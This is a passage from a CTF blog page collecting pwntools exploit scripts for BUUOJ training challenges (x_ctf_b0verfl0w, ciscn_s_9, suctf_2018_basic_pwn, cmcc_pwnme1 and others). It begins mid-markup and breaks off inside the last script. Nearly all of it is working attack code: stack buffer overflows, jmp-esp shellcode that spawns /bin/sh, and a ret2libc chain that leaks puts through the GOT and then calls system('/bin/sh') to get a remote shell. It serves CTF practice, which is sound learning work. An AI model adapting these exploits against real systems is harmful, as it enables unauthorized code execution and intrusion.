class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./picoctf_2018_leak_me&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28505</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">ru(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">passwd = ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.close()</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28505</span>)</span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Password.\n&quot;</span>, <span class="string">&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span>)</span><br><span class="line"><span class="comment"># passwd = 0</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,28505)</span></span><br><span class="line"><span class="comment"># sla(&#x27;\n&#x27;, &#x27;aaa&#x27;)</span></span><br><span class="line"><span class="comment"># sla(&quot;Password.\n&quot;, chr(passwd)+&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># recv = p.recv()</span></span><br><span class="line"><span class="comment"># if &quot;Incorrect&quot; in recv:</span></span><br><span class="line"><span class="comment"># p.close()</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># print recv</span></span><br><span class="line"><span class="comment"># break</span></span><br><span class="line"><span class="comment"># passwd += 1</span></span><br><span class="line"><span class="comment"># if passwd &gt;1000:</span></span><br><span class="line"><span class="comment"># break</span></span><br><span class="line"><span class="comment"># print(&quot;No find&quot;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-97-x-ctf-b0verfl0w-solve"><a href="#NO-97-x-ctf-b0verfl0w-solve" class="headerlink" title="NO.97 x_ctf_b0verfl0w_solve"></a>NO.97 x_ctf_b0verfl0w_solve</h1><h3 id="exp-97"><a href="#exp-97" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./x_ctf_b0verfl0w&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29969</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode).ljust(<span class="number">32</span>+<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = shellcode + p32(jmp_esp)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub esp, 36; call esp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;name?\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-98-ciscn-s-9-solve"><a href="#NO-98-ciscn-s-9-solve" class="headerlink" title="NO.98 ciscn_s_9_solve"></a>NO.98 ciscn_s_9_solve</h1><h3 id="exp-98"><a href="#exp-98" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_9&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25181</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">jmp_esp = <span class="number">0x08048554</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode).ljust(<span class="number">24</span>+<span class="number">8</span>+<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = shellcode + p32(jmp_esp)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub esp,40; call esp&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-99-suctf-2018-basic-pwn-solve"><a href="#NO-99-suctf-2018-basic-pwn-solve" class="headerlink" title="NO.99 suctf_2018_basic_pwn_solve"></a>NO.99 suctf_2018_basic_pwn_solve</h1><h3 id="exp-99"><a href="#exp-99" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./suctf_2018_basic_pwn&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27034</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;suctf_2018_basic_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x0000000000401157</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>+<span class="number">8</span>)+p64(flag)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-100-cmcc-pwnme1-solve"><a href="#NO-100-cmcc-pwnme1-solve" class="headerlink" title="NO.100 cmcc_pwnme1_solve"></a>NO.100 cmcc_pwnme1_solve</h1><h3 id="exp-100"><a href="#exp-100" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./cmcc_pwnme1&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28479</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;cmcc_pwnme1&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag = 0x08048677</span></span><br><span class="line"><span class="comment"># ret = 0x08048476</span></span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*(0xa4+4)+p32(getflag)</span></span><br><span class="line"><span class="comment"># sla(&#x27;\n&#x27;, &#x27;5&#x27;)</span></span><br><span class="line"><span class="comment"># sla(&#x27;fruit:&#x27;, payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)  + p32(puts_plt) + p32(main)+ p32(puts_got)</span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;fruit:&#x27;</span>, payload)</span><br><span class="line">puts = l32()</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">libcbase = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)  + p32(system) + p32(main)+ p32(binsh)</span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;fruit:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-101-oneshot-tjctf-2016-solve"><a href="#NO-101-oneshot-tjctf-2016-solve" class="headerlink" title="NO.101 oneshot_tjctf_2016_solve"></a>NO.101 oneshot_tjctf_2016_solve</h1><h3 id="exp-101"><a href="#exp-101" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,)</span><br><span class="line">elf = ELF(<span class="string">&#x27;oneshot_tjctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span 